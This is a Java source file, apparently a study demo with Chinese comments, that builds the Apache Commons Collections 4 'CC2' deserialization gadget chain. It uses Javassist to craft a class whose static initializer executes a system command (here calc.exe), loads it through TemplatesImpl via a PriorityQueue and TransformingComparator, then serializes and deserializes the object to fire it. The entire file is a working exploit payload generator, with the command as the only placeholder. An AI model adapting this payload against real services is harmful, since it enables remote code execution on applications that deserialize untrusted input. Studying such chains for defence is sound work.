package org.example.cc;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class cc2Demo2 {

    public static void main(String[] args) throws Exception {
        // 反射实例化InvokerTransformer对象，设置InvokerTransformer的methodName为"newTransformer"
        Constructor constructor = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer").getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance("newTransformer");

        // 实例化一个TransformingComparator对象，并且传入了transformer，需要注意TransformingComparator中的compare方法
        TransformingComparator comparator = new TransformingComparator(transformer);
        // 实例化PriorityQueue对象，
        PriorityQueue queue = new PriorityQueue(1);




        // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。
        ClassPool pool = ClassPool.getDefault();
        // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        // 使用容器新建一个CtClass，相当于新建一个class，类名为Cat
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        // 给这个类创建 static 代码块，并插入到类中
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        // 重新设置类名为一个随机的名字
        cc.setName(randomClassName);
        // 给这个类添加一个父类，即继承该父类。
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
        // 将这个类输出到项目目录下
        //将生成的类文件保存下来
        cc.writeFile("./");
        // 将这个class转换为字节数组
        byte[] classBytes = cc.toBytecode();
        // 将字节数组放置到一个二维数组的第一个元素
        byte[][] targetByteCodes = new byte[][]{classBytes};
//        System.out.println(targetByteCodes);
        // 实例化TemplatesImpl对象
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        // 通过反射设置字段的值为二维字节数组，
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        // 进入 defineTransletClasses() 方法需要的条件
        setFieldValue(templates, "_name", "name");
        setFieldValue(templates, "_class", null);
        // 新建一个对象数组
        Object[] queue_array = new Object[]{templates,1};


        // 反射设置PriorityQueue的queue值
        Field queue_field = Class.forName("java.util.PriorityQueue").getDeclaredField("queue");
        queue_field.setAccessible(true);
        queue_field.set(queue,queue_array);

        // 反射设置PriorityQueue的size值
        Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
        size.setAccessible(true);
        size.set(queue,2);

        // 反射设置PriorityQueue的comparator值
        Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        comparator_field.setAccessible(true);
        comparator_field.set(queue,comparator);


        try{
            // 序列化对象
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("result.ser"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(new File("result.ser")));
            objectInputStream.readObject();
            objectInputStream.close();
        }catch(Exception e){
            e.printStackTrace();
        }

    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}

